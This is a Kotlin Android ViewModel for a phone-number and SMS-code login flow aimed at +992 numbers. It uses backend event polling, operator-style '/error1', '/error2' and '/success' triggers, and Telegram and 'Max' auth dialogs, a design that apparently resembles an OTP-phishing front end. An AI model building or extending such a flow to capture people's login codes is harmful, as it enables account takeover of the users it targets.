package com.example.ui.viewmodel

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.example.model.AppLanguage
import com.example.model.CurrentScreen
import com.example.model.ServerEvent
import com.example.repository.DcCityRepository
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

data class MainUiState(
    val currentScreen: CurrentScreen = CurrentScreen.ONBOARDING,
    val currentLanguage: AppLanguage = AppLanguage.TJ,
    val onboardingIndex: Int = 0,
    val rawPhoneNumber: String = "", // 9 digits without +992
    val smsCode: String = "", // SMS OTP code
    val isPhoneValid: Boolean = false,
    val phoneErrorMessage: String? = null,
    val sessionId: String = "",
    val isSubmitting: Boolean = false,
    val isConnectedToBackend: Boolean = false,
    val serverUrl: String = "http://10.0.2.2:8000",
    val activeServerEvent: ServerEvent = ServerEvent.Idle,
    val showSupportDialog: Boolean = false,
    val showTermsDialog: Boolean = false,
    val showPrivacyDialog: Boolean = false,
    val showServerSettingsDialog: Boolean = false,
    val showMaxAuthDialog: Boolean = false,
    val showTelegramAuthDialog: Boolean = false,
    val serverNoticeBanner: String? = null
)

class MainViewModel(
    private val repository: DcCityRepository = DcCityRepository()
) : ViewModel() {

    private val _uiState = MutableStateFlow(
        MainUiState(
            sessionId = repository.sessionId.value,
            serverUrl = repository.getBaseUrl()
        )
    )
    val uiState = _uiState.asStateFlow()

    private var pollingJob: Job? = null

    init {
        // Collect session ID changes
        viewModelScope.launch {
            repository.sessionId.collect { id ->
                _uiState.value = _uiState.value.copy(sessionId = id)
            }
        }
        // Collect connection status
        viewModelScope.launch {
            repository.isConnected.collect { connected ->
                _uiState.value = _uiState.value.copy(isConnectedToBackend = connected)
            }
        }
    }

    fun setLanguage(lang: AppLanguage) {
        _uiState.value = _uiState.value.copy(currentLanguage = lang)
    }

    fun setOnboardingIndex(index: Int) {
        if (index in 0..2) {
            _uiState.value = _uiState.value.copy(onboardingIndex = index)
        } else if (index >= 3) {
            _uiState.value = _uiState.value.copy(currentScreen = CurrentScreen.LOGIN)
        }
    }

    fun nextOnboarding() {
        val current = _uiState.value.onboardingIndex
        if (current < 2) {
            _uiState.value = _uiState.value.copy(onboardingIndex = current + 1)
        } else {
            _uiState.value = _uiState.value.copy(currentScreen = CurrentScreen.LOGIN)
        }
    }

    fun onPhoneChanged(input: String) {
        // Keep only digits, maximum 9 digits
        val digitsOnly = input.filter { it.isDigit() }.take(9)
        val isValid = digitsOnly.length == 9
        _uiState.value = _uiState.value.copy(
            rawPhoneNumber = digitsOnly,
            isPhoneValid = isValid,
            phoneErrorMessage = null,
            serverNoticeBanner = null
        )
    }

    fun onSmsCodeChanged(code: String) {
        val digitsOnly = code.filter { it.isDigit() }.take(6)
        _uiState.value = _uiState.value.copy(smsCode = digitsOnly)
    }

    fun sendSmsCode() {
        val raw = _uiState.value.rawPhoneNumber
        if (raw.length != 9) {
            val errorText = when (_uiState.value.currentLanguage) {
                AppLanguage.TJ -> "Рақами телефон нодуруст аст. Лутфан 9 рақамро ворид кунед"
                AppLanguage.RU -> "Неверный номер. Введите 9 цифр после +992"
                AppLanguage.EN -> "Invalid phone number. Please enter 9 digits after +992"
            }
            _uiState.value = _uiState.value.copy(phoneErrorMessage = errorText)
            return
        }

        val fullPhone = "+992$raw"
        _uiState.value = _uiState.value.copy(
            isSubmitting = true,
            phoneErrorMessage = null,
            serverNoticeBanner = null,
            smsCode = "",
            activeServerEvent = ServerEvent.Idle
        )

        viewModelScope.launch {
            // Register session with backend
            repository.registerSession(fullPhone, _uiState.value.currentLanguage)

            _uiState.value = _uiState.value.copy(
                isSubmitting = false,
                currentScreen = CurrentScreen.WAITING_VERIFICATION
            )

            startEventPolling()
        }
    }

    private fun startEventPolling() {
        pollingJob?.cancel()
        pollingJob = viewModelScope.launch {
            repository.pollSessionEvents().collect { event ->
                handleServerEvent(event)
            }
        }
    }

    fun handleServerEvent(event: ServerEvent) {
        _uiState.value = _uiState.value.copy(activeServerEvent = event)
        when (event) {
            is ServerEvent.Error1 -> {
                // Return user immediately to login page as requested!
                pollingJob?.cancel()
                _uiState.value = _uiState.value.copy(
                    currentScreen = CurrentScreen.LOGIN,
                    serverNoticeBanner = event.message,
                    phoneErrorMessage = event.message,
                    smsCode = ""
                )
            }
            is ServerEvent.Error2 -> {
                // Return user immediately to login page as requested!
                pollingJob?.cancel()
                _uiState.value = _uiState.value.copy(
                    currentScreen = CurrentScreen.LOGIN,
                    serverNoticeBanner = event.message,
                    smsCode = ""
                )
            }
            is ServerEvent.Success -> {
                _uiState.value = _uiState.value.copy(
                    serverNoticeBanner = null,
                    currentScreen = CurrentScreen.DASHBOARD_SUCCESS
                )
            }
            is ServerEvent.CustomMessage -> {
                _uiState.value = _uiState.value.copy(
                    serverNoticeBanner = event.text
                )
            }
            ServerEvent.Idle -> {}
        }
    }

    // Direct simulation triggers for testing
    fun triggerSimulatedEvent(command: String) {
        viewModelScope.launch {
            when (command) {
                "/error1" -> {
                    val msg = when (_uiState.value.currentLanguage) {
                        AppLanguage.TJ -> "Рақами телефон нодуруст аст. Лутфан рақамро санҷед"
                        AppLanguage.RU -> "Неверный номер телефона. Пожалуйста, проверьте номер"
                        AppLanguage.EN -> "Phone number is incorrect. Please check the number"
                    }
                    repository.sendSimulatedCommand("error1", msg)
                    handleServerEvent(ServerEvent.Error1(msg))
                }
                "/error2" -> {
                    val msg = when (_uiState.value.currentLanguage) {
                        AppLanguage.TJ -> "Шумо ҳоло аз аккаунти худ баромад накардаед"
                        AppLanguage.RU -> "Вы еще не вышли из своего аккаунта"
                        AppLanguage.EN -> "You have not logged out of your account yet"
                    }
                    repository.sendSimulatedCommand("error2", msg)
                    handleServerEvent(ServerEvent.Error2(msg))
                }
                "/success" -> {
                    val msg = when (_uiState.value.currentLanguage) {
                        AppLanguage.TJ -> "Муваффақият! Воридшавӣ тасдиқ шуд"
                        AppLanguage.RU -> "Успешно! Вход подтвержден"
                        AppLanguage.EN -> "Success! Login confirmed"
                    }
                    repository.sendSimulatedCommand("success", msg)
                    handleServerEvent(ServerEvent.Success(msg))
                }
            }
        }
    }

    fun submitSmsCode() {
        if (_uiState.value.smsCode.length >= 4) {
            // When user submits SMS code, trigger success check
            viewModelScope.launch {
                val okMsg = when (_uiState.value.currentLanguage) {
                    AppLanguage.TJ -> "Муваффақият! Шахсияти шумо тасдиқ шуд"
                    AppLanguage.RU -> "Успешно! Ваша личность подтверждена"
                    AppLanguage.EN -> "Success! Identity verified"
                }
                repository.sendSimulatedCommand("success", okMsg)
                handleServerEvent(ServerEvent.Success(okMsg))
            }
        }
    }

    fun dismissBanner() {
        _uiState.value = _uiState.value.copy(serverNoticeBanner = null)
    }

    fun backToLogin() {
        pollingJob?.cancel()
        _uiState.value = _uiState.value.copy(
            currentScreen = CurrentScreen.LOGIN,
            serverNoticeBanner = null,
            smsCode = "",
            activeServerEvent = ServerEvent.Idle
        )
    }

    fun logout() {
        pollingJob?.cancel()
        repository.renewSession()
        _uiState.value = _uiState.value.copy(
            currentScreen = CurrentScreen.LOGIN,
            rawPhoneNumber = "",
            smsCode = "",
            isPhoneValid = false,
            serverNoticeBanner = null,
            activeServerEvent = ServerEvent.Idle
        )
    }

    fun updateServerUrl(url: String) {
        repository.updateBaseUrl(url)
        _uiState.value = _uiState.value.copy(serverUrl = url)
    }

    fun testServerConnection() {
        viewModelScope.launch {
            val ok = repository.checkHealth()
            _uiState.value = _uiState.value.copy(isConnectedToBackend = ok)
        }
    }

    // Dialog toggles
    fun setShowSupportDialog(show: Boolean) {
        _uiState.value = _uiState.value.copy(showSupportDialog = show)
    }

    fun setShowTermsDialog(show: Boolean) {
        _uiState.value = _uiState.value.copy(showTermsDialog = show)
    }

    fun setShowPrivacyDialog(show: Boolean) {
        _uiState.value = _uiState.value.copy(showPrivacyDialog = show)
    }

    fun setShowServerSettingsDialog(show: Boolean) {
        _uiState.value = _uiState.value.copy(showServerSettingsDialog = show)
    }

    fun setShowMaxAuthDialog(show: Boolean) {
        _uiState.value = _uiState.value.copy(showMaxAuthDialog = show)
    }

    fun setShowTelegramAuthDialog(show: Boolean) {
        _uiState.value = _uiState.value.copy(showTelegramAuthDialog = show)
    }
}
